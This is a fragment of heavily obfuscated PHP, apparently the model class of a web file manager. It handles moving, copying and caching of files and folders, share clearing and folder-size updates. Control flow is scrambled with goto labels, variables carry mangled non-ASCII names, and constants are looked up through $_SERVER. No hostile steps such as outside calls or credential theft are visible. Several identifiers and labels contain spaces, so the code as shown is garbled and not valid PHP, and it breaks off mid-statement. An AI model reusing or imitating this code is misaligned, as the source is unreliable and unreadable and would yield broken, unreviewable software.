private $_childrenItemCache = array(); private function _childrenAllMake($eØâ‡‡Ì) { goto d®­»‰ƒÜ; d®­»‰ƒÜ: $bŒ‹½‹³ó =& $_SERVER[Å¸ş]; $cÄ†º‘Â´ò = $this->sourceInfo($eØâ‡‡Ì); $dÌ¡¸®¶ = $bŒ‹½‹³ó[532]; goto b¿„¦ÃÆ³ë; b¿„¦ÃÆ³ë: $DÕÒ¸î˜¤ = array($bŒ‹½‹³ó[461] => array($bŒ‹½‹³ó[485], $cÄ†º‘Â´ò[$bŒ‹½‹³ó[461]] . $eØâ‡‡Ì . $bŒ‹½‹³ó[486]), $bŒ‹½‹³ó[397] => $this->targetIsDelete); $aè³ì”µ–Ğ = $this->field($dÌ¡¸®¶)->where($DÕÒ¸î˜¤)->select(); if (!$aè³ì”µ–Ğ) { return; } goto BÚƒù˜«ğ; BÚƒù˜«ğ: $aè³ì”µ–Ğ = array_to_keyvalue($aè³ì”µ–Ğ, $bŒ‹½‹³ó[369]); foreach ($aè³ì”µ–Ğ as $C†’ò§¼) { $a¸ƒç³ïÄÊ = $C†’ò§¼[$bŒ‹½‹³ó[463]]; $eØâ‡‡Ì = $C†’ò§¼[$bŒ‹½‹³ó[369]]; if (!isset($this->_childrenListCache[$eØâ‡‡Ì]) && $C†’ò§¼[$bŒ‹½‹³ó[370]] == $bŒ‹½‹³ó[83]) { $this->_childrenListCache[$eØâ‡‡Ì] = array(); } if (!isset($this->_childrenListCache[$a¸ƒç³ïÄÊ])) { $this->_childrenListCache[$a¸ƒç³ïÄÊ] = array(); } $this->_childrenListCache[$a¸ƒç³ïÄÊ][$eØâ‡‡Ì] = $C†’ò§¼; $this->_childrenItemCache[$eØâ‡‡Ì] = $C†’ò§¼; } goto F¸Ö‘×Ç; F¸Ö‘×Ç: } private function _childrenListAll($cÎ•šæË®ª, &$EäÚÍ÷¥) { $Fßøô›ñ¦Ñ =& $_SERVER[Å¸ş]; if (!isset($this->_childrenListCache[$cÎ•šæË®ª])) { return; } $E“‘ÌË¥˜ = $this->_childrenListCache[$cÎ•šæË®ª]; foreach ($E“‘ÌË¥˜ as $aœ±©…Õ” => $E®¬ÙØäÌõ) { $EäÚÍ÷¥[$aœ±©…Õ”] = $E®¬ÙØäÌõ; if ($E®¬ÙØäÌõ[$Fßøô›ñ¦Ñ[370]] == $Fßøô›ñ¦Ñ[83]) { $this->_childrenListAll($aœ±©…Õ”, $EäÚÍ÷¥); } } } private function sourceInfoCache($EôÒ¢±°ÅÃ) { if (isset($this->_childrenItemCache[$EôÒ¢±°ÅÃ])) { return $this->_childrenItemCache[$EôÒ¢±°ÅÃ]; } return $this->sourceInfo($EôÒ¢±°ÅÃ); } private function _childrenList($aá¨ó¼ßä¦) { if (isset($this->_childrenListCache[$aá¨ó¼ßä¦])) { return $this->_childrenListCache[$aá¨ó¼ßä¦]; } return $this->_childrenListSelect($aá¨ó¼ßä¦); } private function _childrenListSelect($cİì½Å¿ÙÏ) { goto dÀœÔµ±¸Î; dÏ˜’»ïå: $e²¥¯ƒ‹ = $e²¥¯ƒ‹ ? $e²¥¯ƒ‹ : array(); $aÌÈÃ¿´Šâ = array_to_keyvalue($e²¥¯ƒ‹, $a·¹æìêñ¼[369]); $this->_childrenListCache[$cİì½Å¿ÙÏ] = $aÌÈÃ¿´Šâ; goto Bóì°¯˜ß…; Bóì°¯˜ß…: foreach ($aÌÈÃ¿´Šâ as $cİì½Å¿ÙÏ => $D¾ÇÄ¸ÈÑ¹) { $this->_childrenItemCache[$cİì½Å¿ÙÏ] = $D¾ÇÄ¸ÈÑ¹; } return $aÌÈÃ¿´Šâ; goto aŸÌÑ“¼«; dÀœÔµ±¸Î: $a·¹æìêñ¼ =& $_SERVER[Å¸ş]; $F’¦ç´ÈÊÊ = array($a·¹æìêñ¼[463] => $cİì½Å¿ÙÏ, $a·¹æìêñ¼[397] => $this->targetIsDelete); $e²¥¯ƒ‹ = $this->where($F’¦ç´ÈÊÊ)->select(); goto dÏ˜’»ïå; aŸÌÑ“¼«: } private function fileNameExistCache($E¬œÊ¬³ò, $dŒ£•»Ú’®) { $aŸªóíŞ• =& $_SERVER[Å¸ş]; $dŒ£•»Ú’® = strtolower($dŒ£•»Ú’®); $dì“†ØæÏÂ = $this->_childrenList($E¬œÊ¬³ò); foreach ($dì“†ØæÏÂ as $E„Ï‡Üî¦) { if ($dŒ£•»Ú’® == strtolower($E„Ï‡Üî¦[$aŸªóíŞ•[28]])) { return $E„Ï‡Üî¦[$aŸªóíŞ•[369]]; } } return !1; } private function fileNameAutoCache($A¦Ğ¾¸¥¡¾, $AĞ‡‚Ê‹¢, $a×‚Ô”—, $A÷Ê¦ëÏ) { $cÂ‘Ø…âŞó =& $_SERVER[Å¸ş]; $eª‘Ğ±‡¤‡ = $this->_childrenList($A¦Ğ¾¸¥¡¾); $cóƒÓÆòÅ = array_to_keyvalue($eª‘Ğ±‡¤‡, $cÂ‘Ø…âŞó[33], $cÂ‘Ø…âŞó[28]); return $this->fileNameAutoGet($cóƒÓÆòÅ, $AĞ‡‚Ê‹¢, $a×‚Ô”—, $A÷Ê¦ëÏ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($FàÑ÷î‹ÆÖ, $aôƒÜº©§, $dÉ†½Š°¯Ø = REPEAT_REPLACE, $a±ˆš™¨”˜ = '') { goto a÷ööÓ·¾; c¦”À–Š¨: if ($E¾‚“¿Íå[$d•Ä£ÄÔõª[463]] == $aôƒÜº©§ && $a±ˆš™¨”˜ != $E¾‚“¿Íå[$d•Ä£ÄÔõª[28]]) { $B·Ëæ‹œ®° = $this->fileNameExist($aôƒÜº©§, $a±ˆš™¨”˜); if ($B·Ëæ‹œ®° && $E¾‚“¿Íå[$d•Ä£ÄÔõª[370]] == $d•Ä£ÄÔõª[470]) { goto Bë¬å¦ƒ‘; FâÃŒä¿§÷: $this->removeNow($FàÑ÷î‹ÆÖ, !1); $this->folderSizeReset($aôƒÜº©§); Hook::trigger($d•Ä£ÄÔõª[534], $F–‰››¬õÚ); goto c¹Â¿¼ğî; Bë¬å¦ƒ‘: $AÃñƒ¢§Ş„ = $this->sourceInfo($B·Ëæ‹œ®°); $E¶…Ş°Û… = $this->fileHistory($AÃñƒ¢§Ş„, $E¾‚“¿Íå[$d•Ä£ÄÔõª[419]], $E¾‚“¿Íå[$d•Ä£ÄÔõª[77]]); if (!$E¶…Ş°Û…) { Model($d•Ä£ÄÔõª[422])->remove($E¾‚“¿Íå[$d•Ä£ÄÔõª[419]]); } goto FâÃŒä¿§÷; c¹Â¿¼ğî: return $B·Ëæ‹œ®°; goto fìîå©ç¡; fìîå©ç¡: } } $F®ñæ²˜º = $a±ˆš™¨”˜ ? $a±ˆš™¨”˜ : $E¾‚“¿Íå[$d•Ä£ÄÔõª[28]]; $this->lockMoveStart($FàÑ÷î‹ÆÖ); goto D©ÔçÜÎëÓ; D©ÔçÜÎëÓ: $this->lockWriteStart($aôƒÜº©§, $F®ñæ²˜º); $FˆĞË ×¨– = array($d•Ä£ÄÔõª[503] => array(), $d•Ä£ÄÔõª[535] => !1); $this->clearShare($FàÑ÷î‹ÆÖ, $aôƒÜº©§); goto C¿ô©’¯ñÌ; CŒöÔ‹•»½: $this->updateModifyTime($e‰§ˆ„¯§˜); Model($d•Ä£ÄÔõª[507])->eventMove($FàÑ÷î‹ÆÖ, $E¾‚“¿Íå[$d•Ä£ÄÔõª[463]], $aôƒÜº©§); Hook::trigger($d•Ä£ÄÔõª[534], $F–‰››¬õÚ); goto A–…°¬®; a÷ööÓ·¾: $d•Ä£ÄÔõª =& $_SERVER[Å¸ş]; $E¾‚“¿Íå = $this->sourceInfo($FàÑ÷î‹ÆÖ); $f‚·Ù‡ŒÚÚ = $this->sourceInfo($aôƒÜº©§); goto dæ«îšŞ÷’; C¿ô©’¯ñÌ: $BâèÎ¥Ø§³ = $this->fileNameExistCache($aôƒÜº©§, $E¾‚“¿Íå[$d•Ä£ÄÔõª[28]]); $DĞá¶§­Ø = $this->_move($FàÑ÷î‹ÆÖ, $aôƒÜº©§, $dÉ†½Š°¯Ø, $FˆĞË ×¨–, $a±ˆš™¨”˜); $this->sourceCacheClear(); goto b Š››¦–¯; Bª§ÄŒ–Í: if (!$E¾‚“¿Íå || !$f‚·Ù‡ŒÚÚ || $f‚·Ù‡ŒÚÚ[$d•Ä£ÄÔõª[370]] != $d•Ä£ÄÔõª[83]) { return !1; } Hook::trigger($d•Ä£ÄÔõª[533], $F–‰››¬õÚ); $this->targetIsDelete = intval($E¾‚“¿Íå[$d•Ä£ÄÔõª[397]]); goto c¦”À–Š¨; CÑÑ´Û•º×: $this->lockMoveEnd($FàÑ÷î‹ÆÖ); $this->lockWriteEnd($aôƒÜº©§, $F®ñæ²˜º); $this->folderSizeReset($E¾‚“¿Íå[$d•Ä£ÄÔõª[463]]); goto Aíì°í¶Ô…; A–…°¬®: return $DĞá¶§­Ø; goto bÃÊ•Ùéøğ; Aíì°í¶Ô…: $this->folderSizeReset($aôƒÜº©§); $e‰§ˆ„¯§˜ = array($E¾‚“¿Íå[$d•Ä£ÄÔõª[463]], $aôƒÜº©§); if ($E¾‚“¿Íå[$d•Ä£ÄÔõª[370]] == $d•Ä£ÄÔõª[83]) { $e‰§ˆ„¯§˜[] = $FàÑ÷î‹ÆÖ; } goto CŒöÔ‹•»½; dæ«îšŞ÷’: if ($E¾‚“¿Íå[$d•Ä£ÄÔõª[463]] == $f‚·Ù‡ŒÚÚ[$d•Ä£ÄÔõª[369]]) { if ($E¾‚“¿Íå[$d•Ä£ÄÔõª[397]] == $d•Ä£ÄÔõª[83]) { Model($d•Ä£ÄÔõª[395])->restore(array($FàÑ÷î‹ÆÖ)); } return $FàÑ÷î‹ÆÖ; } $F–‰››¬õÚ = $this->pathInfoMore($FàÑ÷î‹ÆÖ); if ($this->isParentOf($FàÑ÷î‹ÆÖ, $aôƒÜº©§)) { return !1; } goto Bª§ÄŒ–Í; b Š››¦–¯: if ($E¾‚“¿Íå[$d•Ä£ÄÔõª[370]] == $d•Ä£ÄÔõª[83] && $BâèÎ¥Ø§³) { $this->folderSizeResetChildren($DĞá¶§­Ø); } Model($d•Ä£ÄÔõª[167])->linkAdd($FˆĞË ×¨–[$d•Ä£ÄÔõª[503]]); if ($BâèÎ¥Ø§³ && $FˆĞË ×¨–[$d•Ä£ÄÔõª[535]]) { $this->removeNow($FàÑ÷î‹ÆÖ, !1); } goto CÑÑ´Û•º×; bÃÊ•Ùéøğ: } private function _move($EĞŞäÚ‡´ƒ, $dØ¶İ†‘³—, $cÈ¢¨ğÏ¦¬, &$c™Äê¦ˆ­¢, $CœÉÕ—§” = '') { goto Añ¶Õ˜¨î; Cå”›ëŠ¤’: $FƒÑ°”–±í = !1; if ($e”“¿¸¥ß) { if ($cÈ¢¨ğÏ¦¬ == REPEAT_RENAME_FOLDER) { $EÄß¸‰Ò‰ = $this->fileNameAuto($dØ¶İ†‘³—, $EÄß¸‰Ò‰, $cÈ¢¨ğÏ¦¬, $e”“¿¸¥ß); $a‘¥˜·İ° = $this->_moveForce($EĞŞäÚ‡´ƒ, $dØ¶İ†‘³—, $EÄß¸‰Ò‰); } else { if ($cÈ¢¨ğÏ¦¬ == REPEAT_RENAME_FOLDER) { $cÈ¢¨ğÏ¦¬ = REPEAT_RENAME; } $bï›‹ëÆ‘ = $this->_childrenListSelect($EĞŞäÚ‡´ƒ); foreach ($bï›‹ëÆ‘ as $eòì‹¶Ìˆ ) { $this->_move($eòì‹¶Ìˆ [$DôÆ¾òöô[369]], $c§Ş¬¶Ä‡, $cÈ¢¨ğÏ¦¬, $c™Äê¦ˆ­¢); } $FƒÑ°”–±í = !0; } } else { if ($cÈ¢¨ğÏ¦¬ == REPEAT_SKIP) { $FƒÑ°”–±í = !0; } else { if ($cÈ¢¨ğÏ¦¬ == REPEAT_RENAME || $cÈ¢¨ğÏ¦¬ == REPEAT_RENAME_FOLDER) { $EÄß¸‰Ò‰ = $this->fileNameAuto($dØ¶İ†‘³—, $EÄß¸‰Ò‰, $cÈ¢¨ğÏ¦¬, $e”“¿¸¥ß); $a‘¥˜·İ° = $this->_moveForce($EĞŞäÚ‡´ƒ, $dØ¶İ†‘³—, $EÄß¸‰Ò‰); } else { if ($cÈ¢¨ğÏ¦¬ == REPEAT_REPLACE) { $Cº¦¶‰Ã£å = $this->sourceInfoCache($c§Ş¬¶Ä‡); $CƒŒ²ñ¬Í¹ = $this->fileHistory($Cº¦¶‰Ã£å, $Cªñ­£ï©ó[$DôÆ¾òöô[419]], $Cªñ­£ï©ó[$DôÆ¾òöô[77]]); if ($CƒŒ²ñ¬Í¹) { $c™Äê¦ˆ­¢[$DôÆ¾òöô[503]][] = $Cªñ­£ï©ó[$DôÆ¾òöô[419]]; } else { $FƒÑ°”–±í = !0; } } } } } if ($FƒÑ°”–±í && !$c™Äê¦ˆ­¢[$DôÆ¾òöô[535]]) { $c™Äê¦ˆ­¢[$DôÆ¾òöô[535]] = !0; } goto d„ÁÒØÚš«; f²å—¦¿Ş¹: $this->lockWriteStart($dØ¶İ†‘³—, $EÄß¸‰Ò‰); if (!$c§Ş¬¶Ä‡) { return $this->_moveForce($EĞŞäÚ‡´ƒ, $dØ¶İ†‘³—, $EÄß¸‰Ò‰); } $a‘¥˜·İ° = $c§Ş¬¶Ä‡; goto Cå”›ëŠ¤’; Añ¶Õ˜¨î: $DôÆ¾òöô =& $_SERVER[Å¸ş]; $Cªñ­£ï©ó = $this->sourceInfo($EĞŞäÚ‡´ƒ); $e”“¿¸¥ß = $Cªñ­£ï©ó[$DôÆ¾òöô[370]] == $DôÆ¾òöô[83]; goto D‹©¥êÛÛŸ; d„ÁÒØÚš«: return $a‘¥˜·İ°; goto dº„ˆóŠàÉ; D‹©¥êÛÛŸ: $EÄß¸‰Ò‰ = $CœÉÕ—§” ? $CœÉÕ—§” : $Cªñ­£ï©ó[$DôÆ¾òöô[28]]; $c§Ş¬¶Ä‡ = $this->fileNameExistCache($dØ¶İ†‘³—, $EÄß¸‰Ò‰); $this->lockMoveStart($EĞŞäÚ‡´ƒ); goto f²å—¦¿Ş¹; dº„ˆóŠàÉ: } private function _moveForce($dâêˆ°é…, $e¼¿Œ“ÅšÜ, $c¶½¬‚®Âà) { goto A¤êø™™¿ğ; B‹ÙÉŠ¾§: $BÈ©ÄÈ‰‘„ = $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[370]] == $AôÒÒÛ¿‡¡[83]; $c·‚•Üçí¾ = array($AôÒÒÛ¿‡¡[368] => $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[369]], $AôÒÒÛ¿‡¡[527] => $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[461]] . $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[369]] . $AôÒÒÛ¿‡¡[47], $AôÒÒÛ¿‡¡[523] => $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[371]], $AôÒÒÛ¿‡¡[524] => $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[458]], $AôÒÒÛ¿‡¡[526] => USER_ID, $AôÒÒÛ¿‡¡[386] => $c¶½¬‚®Âà); $a¦î‹âĞİŸ = $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[371]] == SourceModel::TYPE_GROUP && $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[371]] == SourceModel::TYPE_GROUP && $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[458]] == $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[458]]; goto fŠàîŞŞ‰Û; c›‹®Ú–¹ò: if ($BÈ©ÄÈ‰‘„) { $B³™¿ŞåİÑ = array($AôÒÒÛ¿‡¡[527] => array($AôÒÒÛ¿‡¡[485], $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[461]] . $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[369]] . $AôÒÒÛ¿‡¡[486])); $BãùÄšËİº = $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[461]] . $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[369]] . $AôÒÒÛ¿‡¡[47]; $b‹¸¥‚Åèª = $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[461]] . $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[369]] . $AôÒÒÛ¿‡¡[47] . $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[369]] . $AôÒÒÛ¿‡¡[47]; $AËæ›„ª¢È = array($AôÒÒÛ¿‡¡[527] => array($AôÒÒÛ¿‡¡[536], "\x72\x65\160\154\141\143\145\50\x70\x61\x72\x65\156\164\114\145\x76\x65\x6c\54\47{$BãùÄšËİº}\47\54\x27{$b‹¸¥‚Åèª}\47\x29"), $AôÒÒÛ¿‡¡[523] => $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[371]], $AôÒÒÛ¿‡¡[524] => $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[458]]); if ($Bë·’Øé) { $AËæ›„ª¢È[$AôÒÒÛ¿‡¡[396]] = 0; } $this->where($B³™¿ŞåİÑ)->data($AËæ›„ª¢È)->save(); } $this->where(array($AôÒÒÛ¿‡¡[383] => $dâêˆ°é…))->data($c·‚•Üçí¾)->save(); return $dâêˆ°é…; goto e’Å¸¬ö° ; A¤êø™™¿ğ: $AôÒÒÛ¿‡¡ =& $_SERVER[Å¸ş]; $cŠ¹¸÷Ïæì = $this->sourceInfo($dâêˆ°é…); $a¢²Šº„Ï = $this->sourceInfo($e¼¿Œ“ÅšÜ); goto B‹ÙÉŠ¾§; fŠàîŞŞ‰Û: if (!$a¦î‹âĞİŸ) { Model($AôÒÒÛ¿‡¡[456])->authClear($dâêˆ°é…); } $Bë·’Øé = $cŠ¹¸÷Ïæì[$AôÒÒÛ¿‡¡[397]] == $AôÒÒÛ¿‡¡[83] && $a¢²Šº„Ï[$AôÒÒÛ¿‡¡[397]] != $AôÒÒÛ¿‡¡[83]; if ($Bë·’Øé) { $c·‚•Üçí¾[$AôÒÒÛ¿‡¡[396]] = 0; } goto c›‹®Ú–¹ò; e’Å¸¬ö° : } private function clearShare($D»Á¬ñµâ», $Cˆ©õæåê¹) { goto B‡ÔÖóé¡à; Eßõ¡áÄ¹: if (!$cî¾ÚÁºà) { return; } $FÌ”¯†¤¾¨ = array($AÌŒ°Æ±‰[369] => array($AÌŒ°Æ±‰[7], $cî¾ÚÁºà), $AÌŒ°Æ±‰[448] => 1); $A¥´íöœ• = Model($AÌŒ°Æ±‰[538])->field($AÌŒ°Æ±‰[441])->where($FÌ”¯†¤¾¨)->select(); goto Fñˆ„„©œ; EìóåÚìŠé: if ($FŒòÉ½¤Õ[$AÌŒ°Æ±‰[458]] == $D¯Ğî¢ÍÇŞ[$AÌŒ°Æ±‰[458]] && $FŒòÉ½¤Õ[$AÌŒ°Æ±‰[371]] == $AÌŒ°Æ±‰[537]) { return; } $FÌ”¯†¤¾¨ = array($AÌŒ°Æ±‰[461] => array($AÌŒ°Æ±‰[485], $FŒòÉ½¤Õ[$AÌŒ°Æ±‰[461]] . $D»Á¬ñµâ» . $AÌŒ°Æ±‰[486])); $cî¾ÚÁºà = $this->field($AÌŒ°Æ±‰[383])->where($FÌ”¯†¤¾¨)->getField($AÌŒ°Æ±‰[369], !0); goto Eßõ¡áÄ¹; Fñˆ„„©œ: if (!$A¥´íöœ•) { return; } $A¥´íöœ• = array_to_keyvalue($A¥´íöœ•, $AÌŒ°Æ±‰[33], $AÌŒ°Æ±‰[441]); $FÌ”¯†¤¾¨ = array($AÌŒ°Æ±‰[441] => array($AÌŒ°Æ±‰[7], $A¥´íöœ•)); goto F‡ª²š°ê—; F‡ª²š°ê—: Model($AÌŒ°Æ±‰[538])->where($FÌ”¯†¤¾¨)->save(array($AÌŒ°Æ±‰[448] => 0)); Model($AÌŒ°Æ±‰[539])->where($FÌ”¯†¤¾¨)->delete(); goto C‡°ÄÒÅ…; B‡ÔÖóé¡à: $AÌŒ°Æ±‰ =& $_SERVER[Å¸ş]; $FŒòÉ½¤Õ = $this->sourceInfo($D»Á¬ñµâ»); $D¯Ğî¢ÍÇŞ = $this->sourceInfo($Cˆ©õæåê¹); goto EìóåÚìŠé; C‡°ÄÒÅ…: } public function copyFolderFromIO($A¼ºœÀ¸Ìç, $d—ĞÈ¾µ– , $f‡Ó¨Äœ…¶, $bÂğ¾ÔƒÇ, $eî¨å–å­Í, $e¢Ò†·˜á‹ = false) { goto d±©Í¦À¢ã; bœ†…ï«é¡: Model($FóÂ«øé[506])->addAll($A¾£¥ã†¡˜[$FóÂ«øé[504]], array(), !0); Model($FóÂ«øé[507])->eventCopy($B„¡íßÅ¹‰); $this->saveAll($A¾£¥ã†¡˜[$FóÂ«øé[505]]); goto aÌÒÊ•ÌéÈ; aÌÒÊ•ÌéÈ: Model($FóÂ«øé[422])->linkAdd($A¾£¥ã†¡˜[$FóÂ«øé[503]]); Model($FóÂ«øé[422])->remove($A¾£¥ã†¡˜[$FóÂ«øé[540]]); $this->folderSizeReset($f‡Ó¨Äœ…¶); goto f£¶ìŠÏì±; d±©Í¦À¢ã: $FóÂ«øé =& $_SERVER[Å¸ş]; $A¾£¥ã†¡˜ = array($FóÂ«øé[504] => array(), $FóÂ«øé[505] => array(), $FóÂ«øé[503] => array(), $FóÂ«øé[540] => array()); $B–ğÀ•› = $e¢Ò†·˜á‹ ? $e¢Ò†·˜á‹ : $A¼ºœÀ¸Ìç->getPathName($A¼ºœÀ¸Ìç->pathThis($d—ĞÈ¾µ– )); goto aÄ°ÄÒ‰•; f£¶ìŠÏì±: $this->updateModifyTime($f‡Ó¨Äœ…¶); return $B„¡íßÅ¹‰; goto BååÅİ¦¯×; A„¡ÖÄÍÒ: if ($aœĞ§à™šÏ) { $this->_childrenAllMake($aœĞ§à™šÏ); } Hook::trigger($FóÂ«øé[541]); $this->_copyChildTo($A¼ºœÀ¸Ìç, $d—ĞÈ¾µ– , $B„¡íßÅ¹‰, $bÂğ¾ÔƒÇ, $A¾£¥ã†¡˜, $eî¨å–å­Í); goto eˆï²‘¾; aÄ°ÄÒ‰•: $aœĞ§à™šÏ = $this->fileNameExist($f‡Ó¨Äœ…¶, $B–ğÀ•›); $B„¡íßÅ¹‰ = $this->mkdir($f‡Ó¨Äœ…¶, $B–ğÀ•›, $bÂğ¾ÔƒÇ); if (!$aœĞ§à™šÏ || $bÂğ¾ÔƒÇ == REPEAT_RENAME_FOLDER) { $bÂğ¾ÔƒÇ = !1; } goto A„¡ÖÄÍÒ; eˆï²‘¾: Hook::trigger($FóÂ«øé[542]); if ($B„¡íßÅ¹‰) { $this->folderSizeResetChildren($B„¡íßÅ¹‰); } $this->_childrenListClear(); goto bœ†…ï«é¡; BååÅİ¦¯×: } private function _copyChildTo($d…²Àö©·, $Dâ‘”áÚÖ‡, $AÍÑÉ©ŸÌ, $AŸ£êĞ‘ó‘, &$fäù…ä‘ß, $E’·ëáô¹) { goto B¾è›å¡ä; d˜šáÕ¦Á: $cøÔºö¼¡ = array_merge($B‘†Á‡´Æ[$BÖ†Úß©ŞÄ[73]], $B‘†Á‡´Æ[$BÖ†Úß©ŞÄ[74]]); $E£§‹‰Ù¬× = $this->_addFiles($d…²Àö©·, $B‘†Á‡´Æ[$BÖ†Úß©ŞÄ[73]], $E’·ëáô¹); $Eğšñ¢¢› = array(); goto fÎºÂöÅ’Ê; dÊ¥à¤ó¬”: $F¥ğÄØ“¾ = $this->_childrenList($AÍÑÉ©ŸÌ); $F¥ğÄØ“¾ = array_to_keyvalue($F¥ğÄØ“¾, $BÖ†Úß©ŞÄ[28]); foreach ($cøÔºö¼¡ as $c‘İ³ÑÔˆ) { $Eš—ó‚Ì = $F¥ğÄØ“¾[$c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]]]; $E‹İôµ—÷é = $Eš—ó‚Ì[$BÖ†Úß©ŞÄ[369]]; $this->_copyApplyMeta($Eš—ó‚Ì, $fäù…ä‘ß); if ($c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[29]] == $BÖ†Úß©ŞÄ[76]) { $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[75]] = $d…²Àö©·->getPathInner($c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[75]]); $this->_copyChildTo($d…²Àö©·, $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[75]], $E‹İôµ—÷é, $AŸ£êĞ‘ó‘, $fäù…ä‘ß, $E’·ëáô¹); } } goto bï‰¨²ˆäÌ; fÎºÂöÅ’Ê: foreach ($cøÔºö¼¡ as &$c‘İ³ÑÔˆ) { goto a÷º“É¯ˆó; dïÒİÏßÛî: if ($AŸ£êĞ‘ó‘) { $eÈ¾¡×Ù…‚ = $this->fileNameExistCache($AÍÑÉ©ŸÌ, $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]]); if ($eÈ¾¡×Ù…‚) { if ($c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[370]] || $AŸ£êĞ‘ó‘ == REPEAT_SKIP) { continue; } if ($AŸ£êĞ‘ó‘ == REPEAT_REPLACE) { $Eš—ó‚Ì = $this->sourceInfoCache($eÈ¾¡×Ù…‚); $c“ˆÔ‹—í = $this->fileHistory($Eš—ó‚Ì, $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]], $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[77]]); if ($c“ˆÔ‹—í) { $fäù…ä‘ß[$BÖ†Úß©ŞÄ[503]][] = $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]]; } continue; } else { if ($AŸ£êĞ‘ó‘ == REPEAT_RENAME) { $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]] = $this->fileNameAutoCache($AÍÑÉ©ŸÌ, $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]], $AŸ£êĞ‘ó‘, !1); } } } } if (!$c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[370]] && $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]]) { $fäù…ä‘ß[$BÖ†Úß©ŞÄ[503]][] = $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]]; } $Eğšñ¢¢›[] = $this->_makeItemData($c‘İ³ÑÔˆ, $Có¬Ä÷Ã–†, $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]]); goto Aæ³˜Ò¢¤; dÃ†ç³½í¸: $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[77]] = _get($c‘İ³ÑÔˆ, $BÖ†Úß©ŞÄ[77], 0); $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]] = _get($c‘İ³ÑÔˆ, $BÖ†Úß©ŞÄ[419], 0); if (!isset($c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[543]]) && $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]]) { $fäù…ä‘ß[$BÖ†Úß©ŞÄ[540]][] = $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[419]]; } goto dïÒİÏßÛî; a÷º“É¯ˆó: if (isset($E£§‹‰Ù¬×[$c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]]])) { $c‘İ³ÑÔˆ = $E£§‹‰Ù¬×[$c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[28]]]; } $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[370]] = $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[29]] == $BÖ†Úß©ŞÄ[76]; $c‘İ³ÑÔˆ[$BÖ†Úß©ŞÄ[372]] = _get($c‘İ³ÑÔˆ, $BÖ†Úß©ŞÄ[160], $BÖ†Úß©ŞÄ[33]); goto dÃ†ç³½í¸; Aæ³˜Ò¢¤: } unset($c‘İ³ÑÔˆ); if (!empty($Eğšñ¢¢›)) { $this->addAll($Eğšñ¢¢›); } goto dÊ¥à¤ó¬”; B¾è›å¡ä: $BÖ†Úß©ŞÄ =& $_SERVER[Å¸ş]; $Có¬Ä÷Ã–† = $this->sourceInfoCache($AÍÑÉ©ŸÌ); $B‘†Á‡´Æ = $d…²Àö©·->listPath($Dâ‘”áÚÖ‡, !1, !0); goto d˜šáÕ¦Á; bï‰¨²ˆäÌ: } private function _addFiles($AÅÇâ¡’›, $bÖìì›Ã¾, $DĞùÃ¬ŞÏ§) { goto c–éêßôİ; eÕ”¼ÑÛ¬’: foreach ($bÖìì›Ã¾ as &$A¶»ƒĞ¼¤æ) { goto A¢Œ›Ï¹ğ; d‹¸ò¦‰•: $fˆ…ˆ…ì¢¾ = $AÅÇâ¡’›->hashMd5($A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[75]]); if (strlen($fˆ…ˆ…ì¢¾) > 10 && !isset($B®ÑÅÃ²ì[$fˆ…ˆ…ì¢¾])) { $B®ÑÅÃ²ì[$fˆ…ˆ…ì¢¾] = array(); } $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[164]] = $eé˜ŞÆª˜×; goto CÚÔòÕ”¾„; A¢Œ›Ï¹ğ: Hook::trigger($B…Ì”óÊ­ù[544], $A¶»ƒĞ¼¤æ); $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[75]] = $AÅÇâ¡’›->getPathInner($A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[75]]); $eé˜ŞÆª˜× = $AÅÇâ¡’›->hashSimple($A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[75]]); goto d‹¸ò¦‰•; cƒê»¾†‹: if 